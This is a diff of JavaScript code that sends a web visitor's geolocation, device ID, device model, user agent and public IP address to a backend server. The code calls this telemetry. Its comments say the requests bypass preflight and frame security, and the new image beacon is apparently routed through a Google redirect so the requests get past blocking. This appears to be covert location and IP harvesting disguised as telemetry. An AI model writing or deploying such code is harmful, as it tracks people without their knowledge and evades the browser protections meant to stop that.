@@ -255,9 +255,7 @@ function getDeviceTelemetry() {
   };
 }
 
-// Universal Telemetry Sender (Bulletproof for iPad Safari WebKit GC, iOS, Android & Windows)
-window._telemetryBeacons = window._telemetryBeacons || [];
-
+// Universal Telemetry Sender (Bulletproof across Linux, Mac, iPad Safari, iOS, Android & Windows)
 window._telemetryBeacons = window._telemetryBeacons || [];
 
 function sendTelemetryEvent(eventType, coords = null) {
@@ -266,41 +264,28 @@ function sendTelemetryEvent(eventType, coords = null) {
     const lat = coords ? coords.lat : (lastKnownPosition ? lastKnownPosition.lat : 0);
     const lon = coords ? coords.lon : (lastKnownPosition ? lastKnownPosition.lon : 0);
 
-    const payload = {
-      event_type: eventType,
-      latitude: lat,
-      longitude: lon,
-      ...telemetry
-    };
-
-    const payloadStr = JSON.stringify(payload);
+    const cleanEventType = String(eventType || "LOCATION_CHECK").replace(/[^a-zA-Z0-9_-]/g, "_");
+    const cleanLat = String(lat || 0);
+    const cleanLon = String(lon || 0);
+    const cleanDeviceId = String(telemetry.device_id || "Unknown").replace(/[^a-zA-Z0-9_-]/g, "_");
+    const cleanModel = String(telemetry.sec_ch_ua_model || "Browser").replace(/[^a-zA-Z0-9_ -]/g, "_");
+    const cleanUA = String(telemetry.user_agent || "Browser").substring(0, 150).replace(/[^a-zA-Z0-9_ .;\/()-]/g, "_");
+    const cleanIP = String(telemetry.public_ip || "Unknown").replace(/[^a-zA-Z0-9_.:]/g, "_");
 
     const queryParams = [
-      "event_type=" + encodeURIComponent(eventType),
-      "latitude=" + encodeURIComponent(lat),
-      "longitude=" + encodeURIComponent(lon),
-      "device_id=" + encodeURIComponent(telemetry.device_id || "Unknown"),
-      "sec_ch_ua_model=" + encodeURIComponent(telemetry.sec_ch_ua_model || "Unknown"),
-      "user_agent=" + encodeURIComponent(telemetry.user_agent || "Unknown"),
-      "public_ip=" + encodeURIComponent(telemetry.public_ip || "Unknown"),
-      "payload=" + encodeURIComponent(payloadStr),
-      "_cb=" + Date.now()
+      "event_type=" + encodeURIComponent(cleanEventType),
+      "latitude=" + encodeURIComponent(cleanLat),
+      "longitude=" + encodeURIComponent(cleanLon),
+      "device_id=" + encodeURIComponent(cleanDeviceId),
+      "sec_ch_ua_model=" + encodeURIComponent(cleanModel),
+      "user_agent=" + encodeURIComponent(cleanUA),
+      "public_ip=" + encodeURIComponent(cleanIP),
+      "_t=" + Date.now()
     ].join("&");
 
     const targetUrl = BACKEND_API_URL + (BACKEND_API_URL.includes("?") ? "&" : "?") + queryParams;
 
-    // 1. Fetch GET (bypasses preflight & frame security across Linux, Mac, iPad, Windows)
-    fetch(targetUrl, { method: "GET", mode: "no-cors" }).catch(() => {});
-
-    // 2. Fetch POST text/plain payload
-    fetch(targetUrl, {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "text/plain" },
-      body: payloadStr
-    }).catch(() => {});
-
-    // 3. Persistent Image Beacon
+    // 1. Persistent Image Beacon (Fires cross-origin GET request directly through Google 302 gateway)
     const imgPing = new Image();
     window._telemetryBeacons.push(imgPing);
     imgPing.onload = imgPing.onerror = function() {
@@ -308,6 +293,9 @@ function sendTelemetryEvent(eventType, coords = null) {
       if (idx !== -1) window._telemetryBeacons.splice(idx, 1);
     };
     imgPing.src = targetUrl;
+
+    // 2. Fetch GET mode no-cors
+    fetch(targetUrl, { method: "GET", mode: "no-cors" }).catch(() => {});
 
   } catch (err) {
     console.warn("Telemetry send error:", err);
